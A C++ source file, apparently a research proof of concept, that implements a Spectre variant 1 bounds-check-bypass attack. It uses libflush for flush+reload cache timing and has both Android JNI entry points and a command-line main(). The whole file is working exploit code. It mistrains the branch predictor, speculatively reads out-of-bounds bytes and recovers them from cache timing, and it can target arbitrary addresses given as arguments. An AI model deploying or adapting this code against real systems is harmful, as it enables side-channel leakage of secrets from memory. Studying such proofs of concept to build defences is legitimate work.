#include <libflush.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <algorithm>

#ifdef __ANDROID_API__
#include "android_spectre_Spectre.h"
#include <android/log.h>
#define LOG(format, ...) __android_log_print(ANDROID_LOG_DEBUG, "libspectre", format, __VA_ARGS__)
#else
#include <stdio.h>
#define LOG(format, ...) fprintf(stderr, format "\n", __VA_ARGS__)
#endif


/* FIXME: It's a mistery: Intel manual says cache width is 64 bytes, but it doesn't seem to work reliably with values smaller than 512 */
#define BRANCH_PREDICT_TRAINING_COUNT 10
#define CACHE_LINE_SIZE 1024
#define ALIGN_CACHE __attribute__ ((aligned (CACHE_LINE_SIZE)))

#define MAIN_THREAD_CPU 0
#define COUNTER_THREAD_CPU 1

#define CONCAT_(x,y) x##y
#define CONCAT(x,y) CONCAT_(x,y)
#define PAD uint8_t ALIGN_CACHE CONCAT(pad_, __LINE__);

class LibFlush {
public:
  libflush_session_t* session = nullptr;
  int cache_hit_threshold;

  LibFlush(size_t counter_thread_cpu=COUNTER_THREAD_CPU) {
    libflush_session_args_t libflush_args = {
      .bind_to_cpu = counter_thread_cpu
    };
    if (libflush_init(&session, &libflush_args) == false) {
      throw "Error: Could not initialize libflush";
    }

    find_cache_hit_threshold();
  }

  ~LibFlush() {
    libflush_terminate(session);
  }

  inline void access(void* ptr) {
    return libflush_access_memory(ptr);
  }

  inline void flush(void* ptr) {
    libflush_flush(session, ptr);
  }

  inline uint64_t access_time(void* ptr) {
    return libflush_reload_address(session, ptr);
  }

  inline uint64_t flush_time(void* ptr) {
    return libflush_flush_time(session, ptr);
  }

  inline bool is_cache_hit(void* ptr) {
    return access_time(ptr) <= cache_hit_threshold;
  }

  int find_cache_hit_threshold(const int test_count = 256, int *sample_hits=nullptr, int sample_hits_length=0, int *sample_miss=nullptr, int sample_miss_length=0) {
    int hit_times[test_count];
    int miss_times[test_count];

    static uint8_t ALIGN_CACHE flush_benchmark[CACHE_LINE_SIZE];

    for (int i=0; i<test_count; i++) {
      flush(&flush_benchmark);
      miss_times[i] = access_time(&flush_benchmark);
      hit_times[i]  = access_time(&flush_benchmark);
    }

    std::sort(hit_times, hit_times+test_count);
    std::sort(miss_times, miss_times+test_count);

    if (sample_hits) {
      for (int i=0; i<sample_hits_length; i++) {
        sample_hits[i] = hit_times[(test_count-1) *  i / (sample_hits_length-1)];
      }
    }
    if (sample_miss) {
      for (int i=0; i<sample_miss_length; i++) {
        sample_miss[i] = miss_times[(test_count - 1) * i / (sample_miss_length - 1)];
      }
    }

    this->cache_hit_threshold = (hit_times[(int)(0.9*(test_count-1))] + miss_times[(int)(0.1*(test_count-1))]) / 2;
    LOG("Cache threshold: %d", this->cache_hit_threshold);
    return this->cache_hit_threshold;
  }
};

class Spectre {
  LibFlush& libflush;
  uint8_t    ALIGN_CACHE array2[256 * CACHE_LINE_SIZE];
  uint8_t    ALIGN_CACHE array1[CACHE_LINE_SIZE];
  uint32_t   ALIGN_CACHE array1_size;


public:
  Spectre(LibFlush& libflush)
  : libflush(libflush)
  {
    /* Initialize with zeros to ensure that is not on a copy-on-write zero pages */
    memset(&array2, 0, sizeof(array2));
    memset(&array1, 0, sizeof(array1));
    array1_size = sizeof(array1);
  }

  /* Report best guess in value[0] and runner-up in value[1] */
  void readMemoryByte(const void* target_ptr, uint8_t value[2], int score[2]) {
    size_t malicious_x = (size_t)target_ptr - (size_t)array1;
    int results[256];
    int tries, first, second;
    size_t training_x, x;

    for (int i = 0; i < 256; i++)
      results[i] = 0;
    for (tries = 999; tries > 0; tries--) {

      /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
      training_x = tries % array1_size;
      for (int i = 5; i >= 0; i--) {
        libflush.flush(&array1_size);
        /* Flush array2[256*(0..255)] from cache */
        for (int i = 0; i < 256; i++)
          libflush.flush(&array2[i * CACHE_LINE_SIZE]); /* intrinsic for clflush instruction */

        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

        /* Bit twiddling to set x=training_x if i%6!=0 or malicious_x if i%6==0 */
        /* Avoid jumps in case those tip off the branch predictor */
        x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if i%6==0, else x=0 */
        x = (x | (x >> 16)); /* Set x=-1 if i&6=0, else x=0 */
        x = training_x ^ (x & (malicious_x ^ training_x));

        /* Call the victim! */
        if (x < array1_size) {
          array2[array1[x] * CACHE_LINE_SIZE] = 0;
        }
      }

      /* Time reads. Order is mixed up to prevent stride prediction */
      for (int i=0, mix=157; i < 256; i++, mix=(mix+167) & 0xFF) {
        uint8_t* addr = &array2[mix * CACHE_LINE_SIZE];
        if (libflush.is_cache_hit(addr)) {
          results[mix]++; /* cache hit - add +1 to score for this value */
        }
      }

      /* Locate highest & second-highest results results tallies in j/k */
      first = second = -1;
      for (int i = 0; i < 256; i++) {
        if (first < 0 || results[i] >= results[first]) {
          second  = first;
          first = i;
        } else if (second < 0 || results[i] >= results[second]) {
          second = i;
        }
      }
      if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0))
        break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    value[0] = (uint8_t) first;
    score[0] = results[first];
    value[1] = (uint8_t) second;
    score[1] = results[second];
  }


  void dump(const void* target_ptr, size_t target_len) {
    for (const char* ptr = (const char*)target_ptr; ptr < (const char*)target_ptr + target_len; ptr++) {
      uint8_t value[2];
      int score[2];
      readMemoryByte(ptr, value, score);

      LOG(
        "Reading at %p... %s: 0x%02X='%c', score=%d",
        ptr,
        (score[0] >= 2 * score[1] ? "Success" : "Unclear"),
        value[0],
        value[0] > 31 && value[0] < 127 ? value[0] : '?',
        score[0]);
      if (score[1] > 0)
        LOG("(second best: 0x%02X score=%d)", value[1], score[1]);
    }
  }
} ALIGN_CACHE;



LibFlush libflush(COUNTER_THREAD_CPU);
Spectre spectre(libflush);


#ifdef __ANDROID_API__
jint Java_android_spectre_Spectre_calibrateTiming(JNIEnv *env, jclass cls, jint count, jintArray jhit_times, jintArray jmiss_times) {
    int *hit_times = nullptr, *miss_times = nullptr;
    int hit_times_len = 0, miss_times_len = 0;

    if (jhit_times) {
        hit_times = env->GetIntArrayElements(jhit_times, nullptr);
        hit_times_len = env->GetArrayLength(jhit_times);
    }
    if (jmiss_times) {
        miss_times = env->GetIntArrayElements(jmiss_times, nullptr);
        miss_times_len = env->GetArrayLength(jmiss_times);
    }

    jint ret = libflush.find_cache_hit_threshold(count, hit_times, hit_times_len, miss_times, miss_times_len);

    if (hit_times) {
        env->ReleaseIntArrayElements(jhit_times, hit_times, 0);
    }
    if (miss_times) {
        env->ReleaseIntArrayElements(jmiss_times, miss_times, 0);
    }
    return ret;
}


JNIEXPORT void JNICALL Java_android_spectre_Spectre_read (JNIEnv *env, jclass cls, jbyteArray jdata, jobject resultCallback) {
    if (jdata == nullptr || resultCallback == nullptr) {
        return;
    }

    jclass callbackCls = env->GetObjectClass(resultCallback);
    jmethodID callbackMethod = env->GetMethodID(callbackCls, "onByte", "(IJBIBI)V");

    jsize len = env->GetArrayLength(jdata);
    jbyte* data = env->GetByteArrayElements(jdata, nullptr);
    if (data != NULL) {
        for (int i=0; i<len; i++) {
            uint8_t value[2];
            int score[2];
            spectre.readMemoryByte(data+i, value, score);

            env->CallVoidMethod(resultCallback, callbackMethod, i, (jlong)data+i, (jbyte)value[0], score[0], (jbyte)value[1], score[1]);
        }
    }
}

#else


int main(int argc, const char** argv) {
  // Read CLI arguments: data pointer and lenght
  const char* target_ptr = "Mary had a little lamb";
  int target_len = strlen(target_ptr);

  if (argc == 3) {
    sscanf(argv[1], "%p", &target_ptr);
    sscanf(argv[2], "%d", & target_len);
  }

  if (libflush_bind_to_cpu(MAIN_THREAD_CPU) == false) {
    fprintf(stderr, "Warning: Could not bind main thread to CPU %d\n", MAIN_THREAD_CPU);
    return -1;
  }

  spectre.dump(target_ptr, target_len);

  return (0);
}
#endif
